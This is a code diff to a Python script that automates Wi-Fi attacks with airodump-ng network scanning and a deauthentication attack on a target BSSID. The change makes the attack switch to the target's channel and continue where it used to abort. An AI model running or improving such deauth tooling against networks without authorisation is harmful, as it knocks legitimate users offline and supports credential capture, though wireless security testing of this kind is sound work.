@@ -36,7 +36,7 @@ def scan_networks():
     """Open a terminal to scan for nearby networks."""
     print("[*] Opening a terminal to scan for networks...")
     try:
-        subprocess.Popen(["xfce4-terminal", "--hold", "-e", f"airodump-ng {monitor_interface}"])
+        subprocess.Popen(["xfce4-terminal", "-e", f"airodump-ng {monitor_interface}"])
     except FileNotFoundError:
         print("[!] Terminal not found. Install xfce4-terminal or change terminal emulator.")
         exit(1)
@@ -68,8 +68,12 @@ def perform_deauth(bssid, channel, packet_count):
     # Verify the channel is correctly set
     current_channel = get_current_channel()
     if current_channel != channel:
-        print(f"[!] Current channel ({current_channel}) does not match target channel ({channel}). Aborting attack.")
-        return
+        print(f"[!] Current channel ({current_channel}) does not match target channel ({channel}). Changing channel...")
+        if set_channel(channel):
+            print(f"[*] Channel changed to {channel}. Continuing attack...")
+        else:
+            print("[!] Failed to change channel. Aborting attack.")
+            return
 
     print(f"[*] Launching deauth attack on BSSID: {bssid} with {packet_count} packets...")
     try:
